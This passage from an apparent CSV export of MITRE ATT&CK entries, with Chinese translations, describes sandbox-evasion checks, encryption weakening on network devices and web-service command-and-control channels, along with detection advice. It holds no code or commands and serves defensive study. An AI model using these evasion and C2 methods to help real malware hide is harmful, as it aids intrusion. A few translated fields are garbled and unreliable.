获得的信息来塑造后续行为。（引用：Deloitte Environment Awareness）攻击者可以使用多种方法完成[虚拟化/沙盒规避](https://attack.mitre.org/techniques/T1497)，例如检查安全监控工具（例如，Sysinternals、Wireshark 等）或与分析或虚拟化相关的其他系统工件。攻击者还可以检查合法用户活动，以帮助确定它是否处于分析环境中。其他方法包括在恶意软件代码中使用睡眠计时器或循环以避免在临时沙箱中运行。（引用：Unit 42 Pirpi 2015 年 7 月）
T1497.001,Virtualization/Sandbox Evasion: System Checks,"Adversaries may employ various system checks to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) during automated discovery to shape follow-on behaviors.(Citation: Deloitte Environment Awareness)

Specific checks will vary based on the target and/or adversary, but may involve behaviors such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047), [PowerShell](https://attack.mitre.org/techniques/T1059/001), [System Information Discovery](https://attack.mitre.org/techniques/T1082), and [Query Registry](https://attack.mitre.org/techniques/T1012) to obtain system information and search for VME artifacts. Adversaries may search for VME artifacts in memory, processes, file system, hardware, and/or the Registry. Adversaries may use scripting to automate these checks  into one script and then have the program exit if it determines the system to be a virtual environment. 

Checks could include generic system properties such as host/domain name and samples of network traffic. Adversaries may also check the network adapters addresses, CPU core count, and available memory/drive size. 

Other common checks may enumerate services running that are unique to these applications, installed programs on the system, manufacturer/product fields for strings relating to virtual machine applications, and VME-specific hardware/processor instructions.(Citation: McAfee Virtual Jan 2017) In applications like VMWare, adversaries can also use a special I/O port to send commands and receive output. 
 
Hardware checks, such as the presence of the fan, temperature, and audio devices, could also be used to gather evidence that can be indicative a virtual environment. Adversaries may also query for specific readings from these devices.(Citation: Unit 42 OilRig Sept 2018)",https://attack.mitre.org/techniques/T1497/001,06 March 2020,18 October 2021,2.1,"Defense Evasion, Discovery","Virtualization/sandbox related system checks will likely occur in the first steps of an operation but may also occur throughout as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as lateral movement, based on the information obtained. Detecting actions related to virtualization and sandbox identification may be difficult depending on the adversary's implementation and monitoring required. Monitoring for suspicious processes being spawned that gather a variety of system information or perform other forms of Discovery, especially in a short period of time, may aid in detection.","Linux, Windows, macOS","Command: Command Execution, Process: OS API Execution, Process: Process Creation",True,T1497,"Anti-virus, Host forensic analysis, Signature-based detection, Static File Analysis",Deloitte Threat Library Team,,,,,,,"(Citation: Talos Smoke Loader July 2018),(Citation: NCC Group WastedLocker June 2020),(Citation: SecureList SynAck Doppelgänging May 2018),(Citation: SentinelLabs reversing run-only applescripts 2021),(Citation: Malwarebytes RokRAT VBA January 2021),(Citation: Talos Remcos Aug 2018),(Citation: Securelist Brazilian Banking Malware July 2020),(Citation: Lastline DarkHotel Just In Time Decryption Nov 2015),(Citation: Microsoft DUBNIUM June 2016),(Citation: MSTIC Nobelium Toolset May 2021),(Citation: Secureworks Karagany July 2019),(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ),(Citation: Medium Ali Salem Bumblebee April 2022),(Citation: ClearSky Siamesekitten August 2021),(Citation: Talos Group123),(Citation: Unit 42 BadPatch Oct 2017),(Citation: Talos Frankenstein June 2019),(Citation: 20 macOS Common Tools and Techniques),(Citation: ATT QakBot April 2021),(Citation: Unit 42 Lucifer June 2020),(Citation: Unit42 PlugX June 2017),(Citation: GitHub Pupy),(Citation: Microsoft Analyzing Solorigate Dec 2020),(Citation: Unit 42 WhisperGate January 2022),(Citation: Talos Oblique RAT March 2021),(Citation: ESET InvisiMole June 2020),(Citation: Unit 42 OilRig Sept 2018),(Citation: Kaspersky WIRTE November 2021),(Citation: FireEye SUNSHUTTLE Mar 2021),(Citation: Cybereason Kimsuky November 2020),(Citation: NCCGroup RokRat Nov 2018),(Citation: Trend Micro Qakbot May 2020),(Citation: Kaspersky Lab SynAck May 2018),(Citation: IBM MegaCortex),(Citation: Talos GravityRAT),(Citation: ClearSky Lazarus Aug 2020),(Citation: Unit42 DarkHydrus Jan 2019),(Citation: ESET Okrum July 2019),(Citation: ASERT Donot March 2018),(Citation: Securelist APT10 March 2021),(Citation: ESET EvilNum July 2020),(Citation: Unit 42 DarkHydrus July 2018),(Citation: Medium Eli Salem GuLoader April 2021),(Citation: PaloAlto UBoatRAT Nov 2017),(Citation: Volexity InkySquid BLUELIGHT August 2021),(Citation: Check Point APT34 April 2021),(Citation: ESET Attor Oct 2019),(Citation: Cybereason Cobalt Kitty 2017),(Citation: ESET Grandoreiro April 2020),(Citation: Cyphort EvilBunny Dec 2014),(Citation: Symantec Dyre June 2015),(Citation: MSTIC NOBELIUM Mar 2021),(Citation: Malwarebytes Dyreza November 2015),(Citation: Microsoft FinFisher March 2018),(Citation: Talos PoetRAT April 2020),(Citation: ESET OceanLotus macOS April 2019),",虚拟化/沙箱规避/绕过：系统检查,攻击者可能会使用各种系统检查来检测和避开虚拟化和分析环境。这可能包括基于检查是否存在指示虚拟机环境 (VME) 或沙箱的工件的结果来更改行为。如果对手检测到 VME，他们可能会更改其恶意软件以脱离受害者或隐藏植入物的核心功能。他们还可以在删除辅助或附加有效负载之前搜索 VME 工件。攻击者可能会在自动发现期间使用从 [虚拟化/沙盒规避](https://attack.mitre.org/techniques/T1497) 获得的信息来塑造后续行为。（引用：德勤环境意识）具体检查将根据攻击目标和/或对手，但可能涉及 [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047)、[PowerShell](https://attack.mitre.org/techniques) 等行为/T1059/001)、[系统信息发现](https://attack.mitre.org/techniques/T1082)、[查询注册表](https://attack.mitre.org/techniques/T1012)获取系统信息并搜索 VME 工件。攻击者可能会在内存、进程、文件系统、硬件和/或注册表中搜索 VME 工件。攻击者可能会使用脚本将这些检查自动化到一个脚本中，然后如果程序确定系统是虚拟环境，则程序退出。检查可能包括通用系统属性，例如主机/域名和网络流量样本。攻击者还可以检查网络适配器地址、CPU 核心数和可用内存/驱动器大小。其他常见检查可能会枚举这些应用程序独有的运行服务、系统上安装的程序、与虚拟机应用程序相关的字符串的制造商/产品字段以及 VME 特定的硬件/处理器指令。（引用：McAfee Virtual Jan 2017）在像 VMWare 这样的应用程序，攻击者也可以使用特殊的 I/O 端口来发送命令和接收输出。硬件检查，例如风扇、温度和音频设备的存在，也可用于收集可以指示虚拟环境的证据。攻击者还可以查询这些设备的特定读数。（引文：Unit 42 OilRig 2018 年 9 月）
T1497.003,Virtualization/Sandbox Evasion: Time Based Evasion,"Adversaries may employ various time-based methods to detect and avoid virtualization and analysis environments. This may include enumerating time-based properties, such as uptime or the system clock, as well as the use of timers or other triggers to avoid a virtual machine environment (VME) or sandbox, specifically those that are automated or only operate for a limited amount of time.

Adversaries may employ various time-based evasions, such as delaying malware functionality upon initial execution using programmatic sleep commands or native system scheduling functionality (ex: [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053)). Delays may also be based on waiting for specific victim conditions to be met (ex: system time, events, etc.) or employ scheduled [Multi-Stage Channels](https://attack.mitre.org/techniques/T1104) to avoid analysis and scrutiny.(Citation: Deloitte Environment Awareness)

Benign commands or other operations may also be used to delay malware execution. Loops or otherwise needless repetitions of commands, such as [Ping](https://attack.mitre.org/software/S0097)s, may be used to delay malware execution and potentially exceed time thresholds of automated analysis environments.(Citation: Revil Independence Day)(Citation: Netskope Nitol) Another variation, commonly referred to as API hammering, involves making various calls to [Native API](https://attack.mitre.org/techniques/T1106) functions in order to delay execution (while also potentially overloading analysis environments with junk data).(Citation: Joe Sec Nymaim)(Citation: Joe Sec Trickbot)

Adversaries may also use time as a metric to detect sandboxes and analysis environments, particularly those that attempt to manipulate time mechanisms to simulate longer elapses of time. For example, an adversary may be able to identify a sandbox accelerating time by sampling and calculating the expected value for an environment's timestamp before and after execution of a sleep function.(Citation: ISACA Malware Tricks)",https://attack.mitre.org/techniques/T1497/003,06 March 2020,15 October 2021,1.2,"Defense Evasion, Discovery","Time-based evasion will likely occur in the first steps of an operation but may also occur throughout as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as lateral movement, based on the information obtained. Detecting actions related to virtualization and sandbox identification may be difficult depending on the adversary's implementation and monitoring required. Monitoring for suspicious processes being spawned that gather a variety of system information or perform other forms of Discovery, especially in a short period of time, may aid in detection. ","Linux, Windows, macOS","Command: Command Execution, Process: OS API Execution, Process: Process Creation",True,T1497,"Anti-virus, Host forensic analysis, Signature-based detection, Static File Analysis","Deloitte Threat Library Team; Jeff Felling, Red Canary; Jorge Orchilles, SCYTHE; Ruben Dodge, @shotgunner101",,,,,,,"(Citation: Unit42 Clop April 2021),(Citation: trendmicro xcsset xcode project 2020),(Citation: Kaspersky CactusPete Aug 2020),(Citation: Joe Sec Trickbot),(Citation: Trustwave GoldenSpy June 2020),(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ),(Citation: NCC Group Team9 June 2020),(Citation: Proofpoint Operation Transparent Tribe March 2016),(Citation: Cybereason StrifeWater Feb 2022),(Citation: Malwarebytes Pony April 2016),(Citation: Symantec RAINDROP January 2021),(Citation: Talos Bisonal Mar 2020),(Citation: Kaspersky QakBot September 2021),(Citation: FireEye SUNBURST Backdoor December 2020),(Citation: CISA AppleJeus Feb 2021),(Citation: ClearSky Lazarus Aug 2020),(Citation: Accenture MUDCARP March 2019),(Citation: Group IB GrimAgent July 2021),(Citation: ESET Okrum July 2019),(Citation: TrendMicro Ursnif File Dec 2014),(Citation: Securelist APT10 March 2021),(Citation: Talos Lokibot Jan 2021),(Citation: Kaspersky Tomiris Sep 2021),(Citation: Medium Eli Salem GuLoader April 2021),(Citation: ESET Dukes October 2019),(Citation: Trend Micro DRBControl February 2020),(Citation: wardle evilquest parti),(Citation: Crowdstrike DriveSlayer February 2022),(Citation: JoeSecurity Egregor 2020),(Citation: Medium S2W WhisperGate January 2022),(Citation: Proofpoint Bumblebee April 2022),(Citation: Unit42 BendyBear Feb 2021),(Citation: Cyphort EvilBunny Dec 2014),(Citation: Cyberint Qakbot May 2021),(Citation: MSTIC NOBELIUM Mar 2021),",虚拟化/沙箱规避/绕过：基于时间的规避,攻击者可能会使用各种基于时间的方法来检测和避开虚拟化和分析环境。这可能包括枚举基于时间的属性，例如正常运行时间或系统时钟，以及使用计时器或其他触发器来避免虚拟机环境 (VME) 或沙箱，特别是那些自动化或仅在有限范围内运行的多少时间。攻击者可能会采用各种基于时间的规避措施，例如在初始执行时使用编程睡眠命令或本机系统调度功能延迟恶意软件功能（例如：[Scheduled Task/Job](https://attack.mitre.org/techniques/T1053) ）。延迟也可能基于等待满足特定受害者条件（例如：系统时间、事件等）或使用预定的 [多阶段通道]（https://attack.mitre.org/techniques/T1104）来避免分析和审查。（引用：德勤环境意识）良性命令或其他操作也可能用于延迟恶意软件的执行。循环或其他不必要的命令重复，例如 [Ping](https://attack.mitre.org/software/S0097)s，可用于延迟恶意软件执行并可能超过自动分析环境的时间阈值。（引文： Revil 独立日）（引用：Netskope Nitol）另一种变体，通常称为 API 锤击，涉及对 [Native API]（https://attack.mitre.org/techniques/T1106）函数进行各种调用以延迟执行（同时也可能用垃圾数据使分析环境超载）。（引文：Joe Sec Nymaim）（引文：Joe Sec Trickbot）攻击者也可以使用时间作为检测沙盒和分析环境的指标，特别是那些试图操纵时间机制的环境模拟更长的时间流逝。例如，攻击者可能能够通过在睡眠函数执行前后对环境时间戳进行采样和计算预期值来识别沙盒加速时间。（引用：ISACA 恶意软件技巧）
T1497.002,Virtualization/Sandbox Evasion: User Activity Based Checks,"Adversaries may employ various user activity checks to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) during automated discovery to shape follow-on behaviors.(Citation: Deloitte Environment Awareness)

Adversaries may search for user activity on the host based on variables such as the speed/frequency of mouse movements and clicks (Citation: Sans Virtual Jan 2016) , browser history, cache, bookmarks, or number of files in common directories such as home or the desktop. Other methods may rely on specific user interaction with the system before the malicious code is activated, such as waiting for a document to close before activating a macro (Citation: Unit 42 Sofacy Nov 2018) or waiting for a user to double click on an embedded image to activate.(Citation: FireEye FIN7 April 2017) ",https://attack.mitre.org/techniques/T1497/002,06 March 2020,18 October 2021,1.1,"Defense Evasion, Discovery","User activity-based checks will likely occur in the first steps of an operation but may also occur throughout as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as lateral movement, based on the information obtained. Detecting actions related to virtualization and sandbox identification may be difficult depending on the adversary's implementation and monitoring required. Monitoring for suspicious processes being spawned that gather a variety of system information or perform other forms of Discovery, especially in a short period of time, may aid in detection. ","Linux, Windows, macOS","Command: Command Execution, Process: OS API Execution, Process: Process Creation",True,T1497,"Anti-virus, Host forensic analysis, Signature-based detection, Static File Analysis",Deloitte Threat Library Team,,,,,,,"(Citation: FireEye FIN7 April 2017),(Citation: Lastline DarkHotel Just In Time Decryption Nov 2015),(Citation: ESET Okrum July 2019),(Citation: Unit42 Molerat Mar 2020),",虚拟化/沙箱规避/绕过：基于用户活动的检查,攻击者可能会使用各种用户活动检查来检测和避免虚拟化和分析环境。这可能包括基于检查是否存在指示虚拟机环境 (VME) 或沙箱的工件的结果来更改行为。如果对手检测到 VME，他们可能会更改其恶意软件以脱离受害者或隐藏植入物的核心功能。他们还可以在删除辅助或附加有效负载之前搜索 VME 工件。攻击者可以在自动发现过程中使用从 [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) 获得的信息来塑造后续行为。（引用：Deloitte Environment Awareness）攻击者可以搜索用户基于变量的主机上的活动，例如鼠标移动和点击的速度/频率（引文：Sans Virtual Jan 2016）、浏览器历史记录、缓存、书签或常用目录（如主目录或桌面）中的文件数量。其他方法可能依赖于在激活恶意代码之前与系统的特定用户交互，例如在激活宏之前等待文档关闭（引用：Unit 42 Sofacy Nov 2018）或等待用户双击嵌入的要激活的图像。（引用：FireEye FIN7 2017 年 4 月）
T1600,Weaken Encryption,"Adversaries may compromise a network device’s encryption capability in order to bypass encryption that would otherwise protect data communications. (Citation: Cisco Synful Knock Evolution)

Encryption can be used to protect transmitted network traffic to maintain its confidentiality (protect against unauthorized disclosure) and integrity (protect against unauthorized changes). Encryption ciphers are used to convert a plaintext message to ciphertext and can be computationally intensive to decipher without the associated decryption key. Typically, longer keys increase the cost of cryptanalysis, or decryption without the key.

Adversaries can compromise and manipulate devices that perform encryption of network traffic. For example, through behaviors such as [Modify System Image](https://attack.mitre.org/techniques/T1601), [Reduce Key Space](https://attack.mitre.org/techniques/T1600/001), and [Disable Crypto Hardware](https://attack.mitre.org/techniques/T1600/002), an adversary can negatively effect and/or eliminate a device’s ability to securely encrypt network traffic. This poses a greater risk of unauthorized disclosure and may help facilitate data manipulation, Credential Access, or Collection efforts. (Citation: Cisco Blog Legacy Device Attacks)",https://attack.mitre.org/techniques/T1600,19 October 2020,21 October 2020,1.0,Defense Evasion,"There is no documented method for defenders to directly identify behaviors that weaken encryption. Detection efforts may be focused on closely related adversary behaviors, such as [Modify System Image](https://attack.mitre.org/techniques/T1601). Some detection methods require vendor support to aid in investigation.",Network,File: File Modification,False,,Encryption,,Administrator,,,,,,",",弱加密/消弱加密,攻击者可能会破坏网络设备的加密能力，以绕过原本可以保护数据通信的加密。 （引用：Cisco Synful Knock Evolution）加密可用于保护传输的网络流量，以保持其机密性（防止未经授权的披露）和完整性（防止未经授权的更改）。加密密码用于将明文消息转换为密文，并且在没有相关解密密钥的情况下可以进行大量计算来解密。通常，较长的密钥会增加密码分析或无密钥解密的成本。攻击者可以破坏和操纵执行网络流量加密的设备。比如通过【修改系统镜像】(https://attack.mitre.org/techniques/T1601)、【减少密钥空间】(https://attack.mitre.org/techniques/T1600/001)等行为和[禁用加密硬件](https://attack.mitre.org/techniques/T1600/002)，攻击者可能会对设备安全加密网络流量的能力产生负面影响和/或消除。这会带来更大的未经授权披露的风险，并可能有助于促进数据操作、凭据访问或收集工作。 （引文：思科博客旧设备攻击）
T1600.002,Weaken Encryption: Disable Crypto Hardware,"Adversaries disable a network device’s dedicated hardware encryption, which may enable them to leverage weaknesses in software encryption in order to reduce the effort involved in collecting, manipulating, and exfiltrating transmitted data.

Many network devices such as routers, switches, and firewalls, perform encryption on network traffic to secure transmission across networks. Often, these devices are equipped with special, dedicated encryption hardware to greatly increase the speed of the encryption process as well as to prevent malicious tampering. When an adversary takes control of such a device, they may disable the dedicated hardware, for example, through use of [Modify System Image](https://attack.mitre.org/techniques/T1601), forcing the use of software to perform encryption on general processors. This is typically used in conjunction with attacks to weaken the strength of the cipher in software (e.g., [Reduce Key Space](https://attack.mitre.org/techniques/T1600/001)). (Citation: Cisco Blog Legacy Device Attacks)",https://attack.mitre.org/techniques/T1600/002,19 October 2020,21 October 2020,1.0,Defense Evasion,"There is no documented method for defenders to directly identify behaviors that disable cryptographic hardware. Detection efforts may be focused on closely related adversary behaviors, such as [Modify System Image](https://attack.mitre.org/techniques/T1601) and [Network Device CLI](https://attack.mitre.org/techniques/T1059/008). Some detection methods require vendor support to aid in investigation.",Network,File: File Modification,True,T1600,,,Administrator,,,,,,",",弱加密/消弱加密：禁用加密硬件,攻击者禁用网络设备的专用硬件加密，这可能使他们能够利用软件加密中的弱点来减少收集、操纵和泄露传输数据所涉及的工作量。许多网络设备（如路由器、交换机和防火墙）对网络流量执行加密以确保跨网络传输的安全。通常，这些设备配备了特殊的专用加密硬件，以大大提高加密过程的速度并防止恶意篡改。当攻击者控制此类设备时，他们可能会禁用专用硬件，例如，通过使用 [修改系统映像](https://attack.mitre.org/techniques/T1601)，强制使用软件在通用处理器上执行加密。这通常与攻击结合使用以削弱软件中密码的强度（例如，[减少密钥空间]（https://attack.mitre.org/techniques/T1600/001））。 （引文：思科博客旧设备攻击）
T1600.001,Weaken Encryption: Reduce Key Space,"Adversaries may reduce the level of effort required to decrypt data transmitted over the network by reducing the cipher strength of encrypted communications.(Citation: Cisco Synful Knock Evolution)

Adversaries can weaken the encryption software on a compromised network device by reducing the key size used by the software to convert plaintext to ciphertext (e.g., from hundreds or thousands of bytes to just a couple of bytes). As a result, adversaries dramatically reduce the amount of effort needed to decrypt the protected information without the key.

Adversaries may modify the key size used and other encryption parameters using specialized commands in a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) introduced to the system through [Modify System Image](https://attack.mitre.org/techniques/T1601) to change the configuration of the device. (Citation: Cisco Blog Legacy Device Attacks)",https://attack.mitre.org/techniques/T1600/001,19 October 2020,21 October 2020,1.0,Defense Evasion,"There is no documented method for defenders to directly identify behaviors that reduce encryption key space. Detection efforts may be focused on closely related adversary behaviors, such as [Modify System Image](https://attack.mitre.org/techniques/T1601) and [Network Device CLI](https://attack.mitre.org/techniques/T1059/008). Some detection methods require vendor support to aid in investigation.",Network,File: File Modification,True,T1600,,,Administrator,,,,,,",",弱加密/消弱加密：减少密钥空间,攻击者可以通过降低加密通信的密码强度来降低解密通过网络传输的数据所需的工作量。（引文：Cisco Synful Knock Evolution）攻击者可以通过减小受感染网络设备上使用的密钥大小来削弱加密软件将明文转换为密文的软件（例如，从数百或数千字节转换为仅几个字节）。因此，攻击者大大减少了在没有密钥的情况下解密受保护信息所需的工作量。攻击者可以使用通过 [Modify System Image]（https ://attack.mitre.org/techniques/T1601) 更改设备的配置。 （引文：思科博客旧设备攻击）
T1102,Web Service,"Adversaries may use an existing, legitimate external Web service as a means for relaying data to/from a compromised system. Popular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.

Use of Web services may also protect back-end C2 infrastructure from discovery through malware binary analysis while also enabling operational resiliency (since this infrastructure may be dynamically changed).",https://attack.mitre.org/techniques/T1102,31 May 2017,26 March 2020,1.1,Command and Control,"Host data that can relate unknown or suspicious process activity using a network connection is important to supplement any existing indicators of compromise based on malware command and control signatures and infrastructure or the presence of strong encryption. Packet capture analysis will require SSL/TLS inspection if data is encrypted. Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). User behavior monitoring may help to detect abnormal patterns of activity.(Citation: University of Birmingham C2)","Linux, Windows, macOS","Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow",False,,,Anastasios Pingios,User,,,,,,"(Citation: Zscaler Bazar September 2020),(Citation: FireEye FIN6 Apr 2019),(Citation: Symantec Inception Framework March 2018),(Citation: ESET Gamaredon June 2020),(Citation: MalwareBytes LazyScripter Feb 2021),(Citation: MSTIC Nobelium Toolset May 2021),(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ),(Citation: Zdnet Ngrok September 2018),(Citation: Crowdstrike WhisperGate January 2022),(Citation: FireEye Shining A Light on DARKSIDE May 2021),(Citation: Talos Rocke August 2018),(Citation: Cisco Ukraine Wipers January 2022),(Citation: Unit 42 WhisperGate January 2022),(Citation: Volexity Ocean Lotus November 2020),(Citation: ESET Crutch December 2020),(Citation: MSTIC NOBELIUM Mar 2021),(Citation: FireEye NETWIRE March 2019),(Citation: Intezer Doki July 20),(Citation: Check Point APT35 CharmPower January 2022),(Citation: Bitdefender FIN8 July 2021),(Citation: Unit 42 Hildegard Malware),(Citation: Microsoft WhisperGate January 2022),(Citation: Anomali Rocke March 2019),(Citation: ESET Operation Spalax Jan 2021),(Citation: Cybereason Bazar July 2020),(Citation: Cybereason Molerats Dec 2020),(Citation: Aqua TeamTNT August 2020),(Citation: Medium Eli Salem GuLoader April 2021),(Citation: ClearSky Pay2Kitten December 2020),(Citation: Google EXOTIC LILY March 2022),(Citation: Accenture HyperStack October 2020),(Citation: Medium S2W WhisperGate January 2022),(Citation: Proofpoint Bumblebee April 2022),(Citation: Cisco Talos Intelligence Group),(Citation: Kaspersky Cloud Atlas December 2014),(Citation: Proofpoint TA416 Europe March 2022),(Citation: BleepingComputer Molerats Dec 2020),",Web 服务,攻击者可能会使用现有的合法外部 Web 服务作为向/从受感染系统中继数据的手段。作为 C2 机制的流行网站和社交媒体可能会提供大量掩护，因为网络中的主机可能在妥协之前已经与它们通信。使用通用服务，例如谷歌或推特提供的服务，可以让对手更容易隐藏在预期的噪音中。 Web 服务提供商通常使用 SSL/TLS 加密，为攻击者提供更高级别的保护。使用 Web 服务还可以保护后端 C2 基础设施不被恶意软件二进制分析发现，同时还可以实现操作弹性（因为该基础设施可能会动态更改）。
T1102.002,Web Service: Bidirectional Communication,"Adversaries may use an existing, legitimate external Web service as a means for sending commands to and receiving output from a compromised system over the Web service channel. Compromised systems may leverage popular websites and social media to host command and control (C2) instructions. Those infected systems can then send the output from those commands back over that Web service channel. The return traffic may occur in a variety of ways, depending on the Web service being utilized. For example, the return traffic may take the form of the compromised system posting a comment on a forum, issuing a pull request to development project, updating a document hosted on a Web service, or by sending a Tweet. 

Popular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection. ",https://attack.mitre.org/techniques/T1102/002,14 March 2020,26 March 2020,1.0,Command and Control,"Host data that can relate unknown or suspicious process activity using a network connection is important to supplement any existing indicators of compromise based on malware command and control signatures and infrastructure or the presence of strong encryption. Packet capture analysis will require SSL/TLS inspection if data is encrypted. Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). User behavior monitoring may help to detect abnormal patterns of activity.(Citation: University of Birmingham C2)","Linux, Windows, macOS","Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow",True,T1102,,,User,,,,,,"(Citation: Zscaler APT31 Covid-19 October 2020),(Citation: CyberESI GTALK),(Citation: CISA ComRAT Oct 2020),(Citation: Mandiant APT1),(Citation: ESET Turla Mosquito Jan 2018),(Citation: IBM Grandoreiro April 2020),(Citation: ESET Turla PowerShell May 2019),(Citation: Github PowerShell Empire),(Citation: Talos Group123),(Citation: Meyers Numbered Panda),(Citation: Google Election Threats October 2020),(Citation: Lazarus APT January 2022),(Citation: Talos ROKRAT),(Citation: Volexity InkySquid RokRAT August 2021),(Citation: Microsoft POLONIUM June 2022),(Citation: ESET Crutch December 2020),(Citation: BitDefender Chafer May 2020),(Citation: NCSC GCHQ Small Sieve Jan 2022),(Citation: FireEye APT17),(Citation: ESET ComRAT May 2020),(Citation: FireEye Periscope March 2018),(Citation: Unit 42 Magic Hound Feb 2017),(Citation: Proofpoint Leviathan Oct 2017),(Citation: Anomali Static Kitten February 2021),(Citation: Palo Alto Comnie),(Citation: TrendMicro Pawn Storm Dec 2020),(Citation: Unit42 DarkHydrus Jan 2019),(Citation: ASERT Donot March 2018),(Citation: Securelist ScarCruft May 2019),(Citation: Talos Kimsuky Nov 2021),(Citation: ESET Telebots Dec 2016),(Citation: Mandiant APT1 Appendix),(Citation: Unit 42 Kazuar May 2017),(Citation: Forcepoint Carbanak Google C2),(Citation: Cofense RevengeRAT Feb 2019),(Citation: ESET Dukes October 2019),(Citation: PaloAlto Patchwork Mar 2018),(Citation: PaloAlto UBoatRAT Nov 2017),(Citation: F-Secure CozyDuke),(Citation: Volexity InkySquid BLUELIGHT August 2021),(Citation: Trend Micro DRBControl February 2020),(Citation: ESET Grandoreiro April 2020),(Citation: Talent-Jump Clambling February 2020),(Citation: ESET Telebots June 2017),(Citation: FireEye admin@338),(Citation: FireEye FIN7 Aug 2018),(Citation: Unit 42 Nokki Oct 2018),(Citation: Forcepoint Monsoon),(Citation: TrendMicro Patchwork Dec 2017),(Citation: F-Secure The Dukes),(Citation: Checkpoint IndigoZebra July 2021),(Citation: ESET Turla Mosquito May 2018),(Citation: FireEye APT37 Feb 2018),",Web 服务：双向通信,攻击者可以使用现有的、合法的外部 Web 服务作为通过 Web 服务通道向受感染系统发送命令和从受感染系统接收输出的手段。受感染的系统可能会利用流行的网站和社交媒体来托管命令和控制 (C2) 指令。然后，那些受感染的系统可以通过该 Web 服务通道将这些命令的输出发送回。返回流量可能以多种方式出现，具体取决于所使用的 Web 服务。例如，返回流量可能采用受感染系统在论坛上发表评论、向开发项目发出拉取请求、更新托管在 Web 服务上的文档或发送推文的形式。作为 C2 机制的流行网站和社交媒体可能会提供大量掩护，因为网络中的主机可能在妥协之前已经与它们通信。使用通用服务，例如谷歌或推特提供的服务，可以让对手更容易隐藏在预期的噪音中。 Web 服务提供商通常使用 SSL/TLS 加密，为攻击者提供更高级别的保护。
T1102.001,Web Service: Dead Drop Resolver,"Adversaries may use an existing, legitimate external Web service to host information that points to additional command and control (C2) infrastructure. Adversaries may post content, known as a dead drop resolver, on Web services with embedded (and often obfuscated/encoded) domains or IP addresses. Once infected, victims will reach out to and be redirected by these resolvers.

Popular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.

Use of a dead drop resolver may also protect back-end C2 infrastructure from discovery through malware binary analysis while also enabling operational resiliency (since this infrastructure may be dynamically changed).",https://attack.mitre.org/techniques/T1102/001,14 March 2020,26 March 2020,1.0,Command and Control,Host data that can relate unknown or suspicious process activity using a network connection is important to supplement any existing indicators of compromise based on malware command and control signatures and infrastructure or the presence of strong encryption. Packet capture analysis will require SSL/TLS inspection if data is encrypted. User behavior monitoring may help to detect abnormal patterns of activity.(Citation: University of Birmingham C2),"Linux, Windows, macOS","Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow",True,T1102,,,User,,,,,,"(Citation: Securelist Brazilian Banking Malware July 2020),(Citation: Unit42 Redaman January 2019),(Citation: ESET RTM Feb 2017),(Citation: Secureworks BRONZE BUTLER Oct 2017),(Citation: Securelist MiniDuke Feb 2013),(Citation: FireEye APT17),(Citation: FireEye APT41 Aug 2019),(Citation: Check Point APT35 CharmPower January 2022),(Citation: FireEye Periscope March 2018),(Citation: ESET Casbaneiro Oct 2019),(Citation: Palo Alto PlugX June 2017),(Citation: Anomali Rocke March 2019),(Citation: Securelist Dropping Elephant),(Citation: ESET Dukes October 2019),(Citation: PaloAlto Patchwork Mar 2018),(Citation: Unit42 Xbash Sept 2018),(Citation: Forcepoint Monsoon),(Citation: TrendMicro Patchwork Dec 2017),(Citation: F-Secure The Dukes),(Citation: CheckPoint Redaman October 2019),",Web 服务：Dead Drop Resolver,攻击者可能会使用现有的合法外部 Web 服务来托管指向其他命令和控制 (C2) 基础设施的信息。攻击者可能会在具有嵌入式（通常是混淆/编码）域或 IP 地址的 Web 服务上发布内容，称为死点解析器。一旦被感染，受害者将与这些解析器联系并被重定向。作为 C2 机制的流行网站和社交媒体可能会提供大量掩护，因为网络中的主机可能在妥协之前已经与它们通信。使用通用服务，例如谷歌或推特提供的服务，可以让对手更容易隐藏在预期的噪音中。 Web 服务提供商通常使用 SSL/TLS 加密，为攻击者提供更高级别的保护。使用死点解析器还可以保护后端 C2 基础设施不被恶意软件二进制分析发现，同时还可以实现操作弹性（因为该基础设施可能会动态更改）。
